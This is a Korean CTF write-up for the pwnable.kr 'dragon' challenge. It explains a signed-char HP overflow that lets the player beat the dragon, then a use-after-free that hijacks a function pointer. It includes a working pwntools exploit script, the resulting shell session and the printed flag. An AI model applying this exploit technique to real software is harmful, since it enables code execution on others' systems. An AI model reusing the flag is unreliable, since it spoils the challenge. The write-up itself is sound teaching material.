# [pwnable.kr] dragon writeup



#### [summary] byte overflow 

```shell
I made a RPG game for my little brother.
But to trick him, I made it impossible to win.
I hope he doesn't get too angry with me :P!

Author : rookiss
Download : http://pwnable.kr/bin/dragon

Running at : nc pwnable.kr 9004
```

### structure

```c
00000000 Monster         struc ; (sizeof=0x10, mappedto_1)
00000000 ptr             dd ?                    ; offset
00000004 num             dd ?
00000008 HP              db ?
00000009 MP              db ?
0000000A                 db ? ; undefined
0000000B                 db ? ; undefined
0000000C attack          dd ?                    ; offset
00000010 Monster         ends
00000010
00000000 ; ---------------------------------------------------------------------------
00000000
00000000 User            struc ; (sizeof=0x10, mappedto_2)
00000000 num             dd ?
00000004 HP              dd ?
00000008 MP              dd ?
0000000C ptr             dd ?
00000010 User            ends
```

바이너리에서 사용하는 구조체는 대충 요렇게 생겼다.

### vulnerability

```c
int PriestAttack(struct User *User, struct Monster *Monster){
...
	puts("HolyShield! You Are Temporarily Invincible...");
	printf("But The Dragon Heals %d HP!\n", Monster->MP);
	Monster->HP += Monster->MP;
	User->MP -= 25;
...
}
```

`Priest`의 `HollyShield` 스킬을 사용해가면서 존버하다보면 `HP`가 `char` 형으로 선언되어 있기 때문에, 어느순간 몬스터의 `HP`가 오버플로우가 일어나서 음수가 된다. 이를 이용하면 `Mama Dragon`을 이길 수 있다. `Baby Dragon`은 이길 수 없으시다.. 넘오쌤..

`Mama Dragon`을 이기면 Monster가 사용하던 heap 공간이 free되는데, `FightDragon()`의 루틴을 살펴보면 이미 free된 Monster의 heap 공간을 다시 사용하는 것을 볼 수 있다. 전형적인 uaf임.

```c
int FightDragon(int choice){
    ...
	puts("Well Done Hero! You Killed The Dragon!");
    puts("The World Will Remember You As:");
    str = malloc(0x10u);
    __isoc99_scanf("%16s", str);
    puts("And The Dragon You Have Defeated Was Called:");
    ((void (__cdecl *)(struct Monster *))Monster->ptr)(Monster);
	...
}
```

fastbin의 규칙으로 인해 str은 결국 free되었던 Monster의 공간을 다시 할당받기 때문에, 위의 동작은 임의의 주소공간의 코드를 execution 시키는 것을 유발할 수 있다. 

### exploit

```python
#!/usr/bin/python
from pwn import *

def skip_baby():
	r.sendlineafter('Knight\n','2')
	r.sendlineafter('But You Lose 20 HP.\n', '2')

def kill_the_dragon():
	r.sendlineafter('[ 2 ] Knight\n', '1')
	for i in range(4):
		r.sendlineafter('Temporarily Invincible.\n', '3')
		r.sendlineafter('Temporarily Invincible.\n', '3')	
		r.sendlineafter('Temporarily Invincible.\n', '2')


#r = process('./dragon')
r = remote('pwnable.kr', 9004)

skip_baby()
kill_the_dragon()

_system = 0x8048530
shell = 0x08048DBF

payload = p32(shell)

r.sendlineafter('The World Will Remember You As:\n', payload)


r.interactive()
```

### result

```shell
ch4rli3kop@ubuntu16:~/pwn/pwnable.kr/dragon$ python sol_dragon.py 
[+] Opening connection to pwnable.kr on port 9004: Done
[*] Switching to interactive mode
And The Dragon You Have Defeated Was Called:
$ id
uid=1048(dragon) gid=1048(dragon) groups=1048(dragon)
$ ls -l
total 36
-r-xr-x--- 1 root dragon 12284 Jul  1  2014 dragon
-r--r----- 1 root dragon    27 Jul  1  2014 flag
-rw------- 1 root dragon 12950 Jul 11 04:34 log
-rwx------ 1 root root     769 Sep 11  2014 super.pl
$ cat flag
MaMa, Gandhi was right! :)
```

